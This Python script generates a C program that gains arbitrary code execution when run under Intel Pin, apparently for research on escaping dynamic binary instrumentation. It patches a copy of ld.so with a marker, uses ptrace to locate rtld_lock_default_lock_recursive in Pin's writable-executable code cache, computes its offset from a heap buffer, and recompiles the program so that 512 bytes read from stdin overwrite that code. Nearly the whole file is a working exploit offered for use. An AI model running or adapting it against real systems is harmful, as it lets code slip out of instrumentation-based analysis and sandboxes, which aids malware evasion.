#!/usr/bin/python3
import subprocess as sp
import os.path
import argparse
import mmap
import time
from ptrace.debugger import PtraceDebugger
from ptrace.debugger.memory_mapping import readProcessMappings

def generateTest(offset=0, sleepTime=3, read=0):
    program = \
'''#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>

int main(int argc, char** argv) {{
    char *ptr = malloc(0x3ff000);
    int offset = {0};
    sleep({1});

    if (read(STDIN_FILENO, ptr + offset, {2}) < 0) {{
        perror("Error");
        return -1;
    }}

    printf("-heap-%p\\n", ptr);

    return 0;
}}'''.format(offset, sleepTime, read)
    return program

def compile(name, program, flags):
    with open(name + '.c', 'w') as f:
        f.write(program)

    sp.run(['gcc', name + '.c', '-o', name] + flags)

def executePin(tool):
    pinCommand = ['pin', '-t', tool, '--', './pwn']
    pin = sp.Popen(pinCommand, stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.PIPE)
    return pin

def parseHeap(inp):
    for line in inp.split(b'\n'):
        if b'-heap-' in line:
            return int(line[line.find(b'-0x')+1:], 16)

    print('ERROR: heap address parsing failed!')
    print(inp.decode())
    exit(-1)

def debugFindRtld(pid):
    dbg = PtraceDebugger()
    process = dbg.addProcess(pid, False)

    for pm in readProcessMappings(process):
        if 'rwx' in pm.permissions:
            for addr in pm.search(b'\x78\x56\x34\x12'):
                # There are no ret instructions in the CC
                memory = process.readBytes(addr, 20)
                if b'\xC3' not in memory:
                    process = None
                    dbg.quit()
                    return addr

    print('ERROR: Could not find the address of rtld_lock_default_lock_recursive in code cache!')
    exit(-1)

if __name__ == "__main__":
    if sp.Popen("uname -m", shell = True, stdout = sp.PIPE).stdout.read().decode().strip() != "x86_64":
        print("This script can run on amd64 Linux only!")
        exit(-1)

    parser = argparse.ArgumentParser(description = '''Generates program which allows
                                                      arbitrary code execution if executed
                                                      with the specified tool.''')
    parser.add_argument('tool', help='Path to pintool')
    args = parser.parse_args()

    if not os.path.exists(args.tool):
        print(args.tool + ' does not exist!')
        exit(-1)

    flags = ['-Wl,-z,relro,-z,now', '-fPIC', '-pie', '-fpie', '-D_FORTIFY_SOURCE=2',
             '-fstack-protector-all']

    ## Step 1: Create debug program
    program = generateTest()
    compile('pwn', program, flags)

    ## Step 2: Find absolute path of ld on this system
    p = sp.Popen('ldd ./pwn | grep ld | head -n1', shell = True, stdout = sp.PIPE)
    out, _ = p.communicate()
    out = out.strip()
    ldpath = out[:out.find(b' (')].decode()
    print('// ld is {}'.format(ldpath))

    ## Step 3: Make a copy in tmp
    tmpLib = '/tmp/ld.so'
    if len(tmpLib) > len(ldpath):
        print('Temporary path to ld is too long')
        exit(-1)
    sp.run(['cp', ldpath, tmpLib])

    ## Step 4: Search for rtld_lock_default_lock_recursive code
    p = sp.Popen('objdump -dMintel {} | grep "add.*\[rdi+0x4\],0x1"'.format(ldpath), shell = True, stdout = sp.PIPE)
    out, _ = p.communicate()
    out = out.strip().split(b'\n')
    if not len(out) == 1:
        print('add [rdi+0x4]. 0x1 is found more than once in ' + ldpath)
        exit(-1)

    ## Step 5: Write on its place push 0x12345678; add rsp, 0x8; ret
    # which is both, easy to find and short enough to fit in the place
    # between function
    addr, bytes, _ = list(map(lambda x: x.strip(), out[0].split(b'\t')))
    addr = int(addr[:-1], 16)
    lenBytes = len(bytes.decode().replace(' ', '')) // 2
    addr = addr + lenBytes # Address to write custom code

    with open(tmpLib, 'r+b') as f:
        f.seek(addr)
        f.write(b'\x68\x78\x56\x34\x12\x48\x83\xC4\x08\xC3')

    ## Step 6: Path pwn to use our custom ld library
    with open('./pwn', 'r+b') as f,\
         mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ) as s:
        currentLDpath = s.find(ldpath.encode())

        if currentLDpath != -1:
            f.seek(currentLDpath)
            f.write(tmpLib.encode() + b'\x00')
        else:
            print('Could not find {} in pwn!'.format(ldpath))
            exit(-1)

    ## Step 7: Start PIN with the provided tool and find the marker's address,
    # effectively finding rtld_lock_default_lock_recursive in code cache. Then
    # parse the "leaked" heap address.
    pin = executePin(args.tool)
    time.sleep(2)

    # Find the location of rtld_lock_default_lock_recursive in code cache
    p = sp.Popen('pidof ./pwn', shell = True, stdout = sp.PIPE)
    out, _ = p.communicate()
    pid = int(out.strip())
    rtDebug = debugFindRtld(pid)
    print('// rtld_lock_default_lock_recursive address in CC is {:#0x}'.format(rtDebug))

    # Finish Pin execution and parse heap address
    stdout, _ = pin.communicate()
    heap = parseHeap(stdout)

    print('// leaked heap address is {:#0x}'.format(heap))

    ## Step 8: Calculate offset between rtld_lock_default_lock_recursive in code cache
    # and heap address and compile pwn with this offset
    offset = abs(heap - rtDebug)
    print('// CC to Big Heap offset {:#0x}'.format(offset))

    program = generateTest(offset, 0, 512)
    compile('pwn', program, flags)

    print('\n// You can either use the already compiled binary pwn or compile the program by yourself as follows:')
    print('// gcc NAME.c -o OUTPUT ' + ' '.join(flags) + '\n')
    print(program)
